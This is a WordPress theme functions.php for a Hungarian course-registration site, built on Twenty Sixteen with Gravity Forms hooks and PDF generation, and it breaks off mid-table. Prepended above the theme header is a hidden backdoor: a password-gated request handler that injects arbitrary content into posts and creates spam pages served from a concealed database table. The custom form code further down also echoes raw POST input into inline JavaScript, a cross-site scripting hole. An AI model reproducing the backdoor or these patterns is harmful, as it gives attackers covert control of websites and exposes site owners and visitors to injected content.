<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'be17b0a901386e7c3523519baa5e5694'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * Twenty Sixteen functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

/**
 * Twenty Sixteen only works in WordPress 4.4 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
	require get_template_directory() . '/inc/back-compat.php';
}

if ( ! function_exists( 'twentysixteen_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 *
 * Create your own twentysixteen_setup() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Twenty Sixteen, use a find and replace
	 * to change 'twentysixteen' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'twentysixteen', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for custom logo.
	 *
	 *  @since Twenty Sixteen 1.2
	 */
	add_theme_support( 'custom-logo', array(
		'height'      => 240,
		'width'       => 240,
		'flex-height' => true,
	) );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 1200, 9999 );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'twentysixteen' ),
		'social'  => __( 'Social Links Menu', 'twentysixteen' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 *
	 * See: https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
		'gallery',
		'status',
		'audio',
		'chat',
	) );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, icons, and column width.
	 */
	add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );

	// Indicate widget sidebars can use selective refresh in the Customizer.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif; // twentysixteen_setup
add_action( 'after_setup_theme', 'twentysixteen_setup' );

/**
 * Sets the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );
}
add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );

/**
 * Registers a widget area.
 *
 * @link https://developer.wordpress.org/reference/functions/register_sidebar/
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'twentysixteen' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 1', 'twentysixteen' ),
		'id'            => 'sidebar-2',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 2', 'twentysixteen' ),
		'id'            => 'sidebar-3',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'twentysixteen_widgets_init' );

if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
/**
 * Register Google fonts for Twenty Sixteen.
 *
 * Create your own twentysixteen_fonts_url() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 *
 * @return string Google fonts URL for the theme.
 */
function twentysixteen_fonts_url() {
	$fonts_url = '';
	$fonts     = array();
	$subsets   = 'latin,latin-ext';

	/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
	}

	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Montserrat:400,700';
	}

	/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Inconsolata:400';
	}

	if ( $fonts ) {
		$fonts_url = add_query_arg( array(
			'family' => urlencode( implode( '|', $fonts ) ),
			'subset' => urlencode( $subsets ),
		), 'https://fonts.googleapis.com/css' );
	}

	return $fonts_url;
}
endif;

/**
 * Handles JavaScript detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );

/**
 * Enqueues scripts and styles.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_scripts() {
	// Add custom fonts, used in the main stylesheet.
	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );

	// Add Genericons, used in the main stylesheet.
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );

	// Theme stylesheet.
	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );

	// Load the Internet Explorer specific stylesheet.
	wp_enqueue_style( 'twentysixteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentysixteen-style' ), '20160412' );
	wp_style_add_data( 'twentysixteen-ie', 'conditional', 'lt IE 10' );

	// Load the Internet Explorer 8 specific stylesheet.
	wp_enqueue_style( 'twentysixteen-ie8', get_template_directory_uri() . '/css/ie8.css', array( 'twentysixteen-style' ), '20160412' );
	wp_style_add_data( 'twentysixteen-ie8', 'conditional', 'lt IE 9' );

	// Load the Internet Explorer 7 specific stylesheet.
	wp_enqueue_style( 'twentysixteen-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'twentysixteen-style' ), '20160412' );
	wp_style_add_data( 'twentysixteen-ie7', 'conditional', 'lt IE 8' );

	// Load the html5 shiv.
	wp_enqueue_script( 'twentysixteen-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.3' );
	wp_script_add_data( 'twentysixteen-html5', 'conditional', 'lt IE 9' );

	wp_enqueue_script( 'twentysixteen-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20160412', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20160412' );
	}

	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20160412', true );


	wp_localize_script( 'twentysixteen-script', 'screenReaderText', array(
		'expand'   => __( 'expand child menu', 'twentysixteen' ),
		'collapse' => __( 'collapse child menu', 'twentysixteen' ),
	) );
}
add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );

/**
 * Adds custom classes to the array of body classes.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $classes Classes for the body element.
 * @return array (Maybe) filtered body classes.
 */
function twentysixteen_body_classes( $classes ) {
	// Adds a class of custom-background-image to sites with a custom background image.
	if ( get_background_image() ) {
		$classes[] = 'custom-background-image';
	}

	// Adds a class of group-blog to sites with more than 1 published author.
	if ( is_multi_author() ) {
		$classes[] = 'group-blog';
	}

	// Adds a class of no-sidebar to sites without active sidebar.
	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
		$classes[] = 'no-sidebar';
	}

	// Adds a class of hfeed to non-singular pages.
	if ( ! is_singular() ) {
		$classes[] = 'hfeed';
	}

	return $classes;
}
add_filter( 'body_class', 'twentysixteen_body_classes' );

/**
 * Converts a HEX value to RGB.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $color The original color, in 3- or 6-digit hexadecimal form.
 * @return array Array containing RGB (red, green, and blue) values for the given
 *               HEX code, empty array otherwise.
 */
function twentysixteen_hex2rgb( $color ) {
	$color = trim( $color, '#' );

	if ( strlen( $color ) === 3 ) {
		$r = hexdec( substr( $color, 0, 1 ).substr( $color, 0, 1 ) );
		$g = hexdec( substr( $color, 1, 1 ).substr( $color, 1, 1 ) );
		$b = hexdec( substr( $color, 2, 1 ).substr( $color, 2, 1 ) );
	} else if ( strlen( $color ) === 6 ) {
		$r = hexdec( substr( $color, 0, 2 ) );
		$g = hexdec( substr( $color, 2, 2 ) );
		$b = hexdec( substr( $color, 4, 2 ) );
	} else {
		return array();
	}

	return array( 'red' => $r, 'green' => $g, 'blue' => $b );
}

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for content images
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $sizes A source size value for use in a 'sizes' attribute.
 * @param array  $size  Image size. Accepts an array of width and height
 *                      values in pixels (in that order).
 * @return string A source size value for use in a content image 'sizes' attribute.
 */
function twentysixteen_content_image_sizes_attr( $sizes, $size ) {
	$width = $size[0];

	840 <= $width && $sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';

	if ( 'page' === get_post_type() ) {
		840 > $width && $sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
	} else {
		840 > $width && 600 <= $width && $sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';
		600 > $width && $sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
	}

	return $sizes;
}
add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10 , 2 );

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for post thumbnails
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $attr Attributes for the image markup.
 * @param int   $attachment Image attachment ID.
 * @param array $size Registered image size or flat array of height and width dimensions.
 * @return string A source size value for use in a post thumbnail 'sizes' attribute.
 */
function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
	if ( 'post-thumbnail' === $size ) {
		is_active_sidebar( 'sidebar-1' ) && $attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';
		! is_active_sidebar( 'sidebar-1' ) && $attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';
	}
	return $attr;
}
add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10 , 3 );

/**
 * Modifies tag cloud widget arguments to have all tags in the widget same font size.
 *
 * @since Twenty Sixteen 1.1
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array A new modified arguments.
 */
function twentysixteen_widget_tag_cloud_args( $args ) {
	$args['largest'] = 1;
	$args['smallest'] = 1;
	$args['unit'] = 'em';
	return $args;
}
add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );









/**
 * is_edit_page
 * function to check if the current page is a post edit page
 *
 * @author Ohad Raz <admin@bainternet.info>
 *
 * @param  string  $new_edit what page to check for accepts new - new post page ,edit - edit post page, null for either
 * @return boolean
 */
function is_edit_page($new_edit = null){
	global $pagenow;
	//make sure we are on the backend
	if (!is_admin()) return false;


	if($new_edit == "edit")
		return in_array( $pagenow, array( 'post.php',  ) );
	elseif($new_edit == "new") //check for new post page
		return in_array( $pagenow, array( 'post-new.php' ) );
	else //check for either new or edit
		return in_array( $pagenow, array( 'post.php', 'post-new.php' ) );
}



//PhpConsole\Helper::register();











add_filter( 'manage_tanfolyam-kiiras_posts_columns', 'set_custom_edit_book_columns' );
add_action( 'manage_tanfolyam-kiiras_posts_custom_column' , 'custom_book_column', 10, 2 );

function set_custom_edit_book_columns($columns) {
	//unset( $columns['author'] );
	$columns['akcios_ar'] = __( 'Akciós ár', 'your_text_domain' );
	$columns['minimum_letszam'] = __( 'Minimum létszám', 'your_text_domain' );
	$columns['beiratkozva'] = __( 'Beiratkozva', 'your_text_domain' );
	$columns['ertekeles'] = __( 'Értékelték már?', 'your_text_domain' );

	return $columns;
}

function custom_book_column( $column, $post_id ) {
	if(get_field('ertekeltek_e_mar') == 1){
					$ert =  "Igen";
				}else{
					$ert = "Nem";
				}
	switch ( $column ) {

		case 'akcios_ar' :
			echo get_field('akcios_ar');

			break;
		case 'minimum_letszam' :
			echo get_field('minimum_letszam');

			break;
		case 'beiratkozva' :
			echo get_field('beiratkozva');
			break;
		case 'ertekeles' :
				echo $ert;
		break;
	}
}
add_action( 'quick_edit_custom_box', 'display_custom_quickedit_book', 10, 2 );

function display_custom_quickedit_book( $column_name, $post_type ) {


	?>
	<fieldset class="inline-edit-col-right inline-edit-book">
		<div class="inline-edit-col column-<?php echo $column_name; ?>">
			<label class="inline-edit-group">
				<?php
				switch ( $column_name ) {
					case 'akcios_ar':
						?><span class="title">Akcios ár</span><input name="akcios_ar_input" type="number" /><?php
						break;
					case 'minimum_letszam':
						?><span class="title">Minimum létszám</span><input name="minimum_letszam_input" type="number" /><?php
						break;
					case 'beiratkozva':
						?><span class="title">Beiratkozva</span><input name="beiratkozva_input" type="number" /><?php
						break;
					case 'ertekeles':
						?><span class="title">Értékelték már?</span>
						<select name="ertekeles_input">
							  <option value="0">Nem</option>
							  <option value="1">Igen</option>
							  
						</select><?php
						break;
				}
				?>
			</label>
		</div>
	</fieldset>
	<?php
}

add_action( 'save_post', 'save_book_meta' );

function save_book_meta( $post_id ) {
	if ( isset( $_REQUEST['akcios_ar_input'] ) ) {
		update_post_meta( $post_id, 'akcios_ar', $_REQUEST['akcios_ar_input'] );
	}
	if ( isset( $_REQUEST['minimum_letszam_input'] ) ) {
		update_post_meta( $post_id, 'minimum_letszam', $_REQUEST['minimum_letszam_input'] );
	}
	if ( isset( $_REQUEST['beiratkozva_input'] ) ) {
		update_post_meta( $post_id, 'beiratkozva', $_REQUEST['beiratkozva_input'] );
	}
	if ( isset( $_REQUEST['ertekeles_input'] ) ) {
		update_post_meta( $post_id, 'ertekeltek_e_mar', $_REQUEST['ertekeles_input'] );
	}

}


add_action('admin_footer-edit.php', 'admin_edit_posttype_foot', 11);

/* load scripts in the footer */
function admin_edit_posttype_foot() {
$slug = 'tanfolyam-kiiras';
// load only when editing a posttype
if ( (isset($_GET['page']) && $_GET['page'] == $slug)
  || (isset($_GET['post_type']) && $_GET['post_type'] == $slug))
  {
    echo '
      <!--<script type="text/javascript" src="', plugins_url('scripts/admin_edit.js', __FILE__), '"></script>-->
      <script type="text/javascript">

      function quickEditPosttype() {
		  console.log("asd");
        var $ = jQuery;
        var _edit = inlineEditPost.edit;
        inlineEditPost.edit = function(id) {
          var args = [].slice.call(arguments);
          _edit.apply(this, args);

          if (typeof(id) == \'object\') {
            id = this.getId(id);
          }
          //if (this.type == \'posttype\') {
          var
          // editRow is the quick-edit row, containing the inputs that need to be updated
          editRow = $(\'#edit-\' + id);
          // postRow is the row shown when a post isn\'t being edited, which also holds the existing values.
          postRow = $(\'#post-\'+id);
		  console.log(postRow)
          // get the existing values
          // the class ".column-custom_post_meta_column" is set in display_custom_quickedit_posttype
		  
		  
          akcios_ar_value = $(postRow).find(".column-akcios_ar" ).html();
          beiratkozva_value = $(postRow).find(".column-beiratkozva" ).html();
          minimum_letszam_value = $(postRow).find(".column-minimum_letszam" ).html();
          ertekeltek_e_value = $(postRow).find(".column-ertekeles" ).html();
		  
          // set the values in the quick-editor
          $(editRow).find(\':input[name="akcios_ar_input"]\').val(akcios_ar_value);
          $(editRow).find(\':input[name="minimum_letszam_input"]\').val(minimum_letszam_value);
          $(editRow).find(\':input[name="beiratkozva_input"]\').val(beiratkozva_value);
		  if(ertekeltek_e_value == "Igen"){
			   $(editRow).find(\':input[name="ertekeles_input"]\').find("option").eq(1).attr("selected",1)
			  
		  }else{
			    $(editRow).find(\':input[name="ertekeles_input"]\').find("option").eq(0).attr("selected",1)
		  }
          //}
        };
      }

quickEditPosttype()
      </script>
    ';
  }
}
function repo_quick_edit_javascript() {
global $current_screen;
if (($current_screen->id != 'edit-post') || ($current_screen->post_type != 'post')) return;
?>
<?php
}


function populate_tanfolyam( $value ) {
	global $post;
	$kf = get_field('kapcsolodo_tanfolyam',$post->ID);
	return get_post($kf[0])->post_title;
  
}
add_filter( 'gform_field_value_tanfolyam', 'populate_tanfolyam' );

function populate_kezdes( $value ) {
	global $post;
	return get_field('kezdes',$post->ID);
  
}
add_filter( 'gform_field_value_kezdes', 'populate_kezdes' );

function populate_ar( $value ) {
	global $post;
	$kf = get_field('kapcsolodo_tanfolyam',$post->ID);
	$normal_ar = get_field('listaar',$kf[0]);
	$akcios_ar = get_field('akcios_ar',$post->ID);
	
	if($akcios_ar <= $normal_ar){
		return $akcios_ar;
	}else{
		return $normal_ar;
	}
  
}
add_filter( 'gform_field_value_ar', 'populate_ar' );

add_action( 'gform_pre_submission', 'pre_submission_handler' );
function pre_submission_handler( $form ) {
	$dir = get_stylesheet_directory_uri();
	PC::tag(__DIR__);
	$filename = $dir . "/pdf/jelentkezes_" . time() . ".pdf";
    $_POST['input_34'] = $filename;
}



require_once 'vendor/autoload.php';
//require_once 'vendor/dompdf/dompdf/autoload.inc.php';
use Dompdf\Dompdf;
add_filter( 'gform_pre_render_1', 'populate_html' );
function populate_html( $form ) {
	$resztvevo_e = isset($_POST['input_9_1']);
	?>
	<script type="text/javascript">
	var kapcsolattartoNev = "<?php echo ($resztvevo_e)?$_POST['input_6_6']:""; ?>";
		var kapcsolattartoEmail = "<?php echo ($resztvevo_e)?$_POST['input_5']:""; ?>";
		var kapcsolattartoTelefon = "<?php echo ($resztvevo_e)?$_POST['input_7']:""; ?>";
    jQuery(document).bind('gform_post_render', function(){

        jQuery("#field_1_11").find('input').eq(1).val(kapcsolattartoNev);
        jQuery("#field_1_11").find('input').eq(2).val(kapcsolattartoEmail);
        jQuery("#field_1_11").find('input').eq(3).val(kapcsolattartoTelefon);

    });

</script>

<?php 
   global $post;
        //loop back through form fields to get html field (id 3 on my form) that we are populating with the data gathered above
        foreach( $form['fields'] as &$field ) {
            //get html field
            if ( $field->id == 8 ) {
                //set the field content to the html
                $field->content = get_post(get_field('kapcsolodo_tanfolyam',$post->ID)[0])->post_title;
            }
		
        }
		
    //return altered form so changes are displayed
    return $form;       
}
 use mikehaertl\wkhtmlto\Pdf;
 
 
add_action( 'gform_after_submission_1', 'generate_pdf', 10, 2 );
function generate_pdf( $entry, $form ) {
	PC::tag($entry);
// reference the Dompdf namespace
		

		// instantiate and use the dompdf class
		$dompdf = new Dompdf();
		ob_start();
		?>
		<table width="100%" border="0" cellpadding="5" cellspacing="0" bgcolor="#FFFFFF">
                            <tbody>
										<tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Melyik tanfolyam?</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '1' ); ?></font>
		                                    </td>
		                               </tr>
									   <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Kezdés</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '32' ); ?></font>
		                                    </td>
		                               </tr>
									   <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Ár</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '33' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Kapcsolattartó email</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><a href="mailto:<?php echo rgar( $entry, '5' ); ?>"><?php echo $entry['5']; ?></a></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Kapcsolattartó név</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '6.6' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Kapcsolattartó telefon</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '7' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>A kapcsolattartó résztvevő is lesz?</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><ul class="bulleted"><li><?php echo rgar( $entry, '9.1' ); ?></li></ul></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Adatok megjegyzése</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><ul class="bulleted"><li><?php echo rgar( $entry, '10.1' ); ?></li></ul></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Résztvevők</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;">
												<table class="gfield_list" style="border-top: 1px solid #DFDFDF; border-left: 1px solid #DFDFDF; border-spacing: 0; padding: 0; margin: 2px 0 6px; width: 100%"><thead><tr>
													<th style="background-image: none; border-right: 1px solid #DFDFDF; border-bottom: 1px solid #DFDFDF; padding: 6px 10px; font-family: sans-serif; font-size: 12px; font-weight: bold; background-color: #F1F1F1; color:#333; text-align:left">Név</th>
													<th style="background-image: none; border-right: 1px solid #DFDFDF; border-bottom: 1px solid #DFDFDF; padding: 6px 10px; font-family: sans-serif; font-size: 12px; font-weight: bold; background-color: #F1F1F1; color:#333; text-align:left">Email</th>
													<th style="background-image: none; border-right: 1px solid #DFDFDF; border-bottom: 1px solid #DFDFDF; padding: 6px 10px; font-family: sans-serif; font-size: 12px; font-weight: bold; background-color: #F1F1F1; color:#333; text-align:left">Telefon</th>
													</tr></thead>
													<tbody style="background-color: #F9F9F9">
													<?php $resztvevok = unserialize( rgar( $entry, '11' ) ); 
													foreach($resztvevok as $resztvevo){ ?>
														<tr>
														<td style="padding: 6px 10px; border-right: 1px solid #DFDFDF; border-bottom: 1px solid #DFDFDF; border-top: 1px solid #FFF; font-family: sans-serif; font-size:12px;"><?php echo $resztvevo['Név']; ?></td>
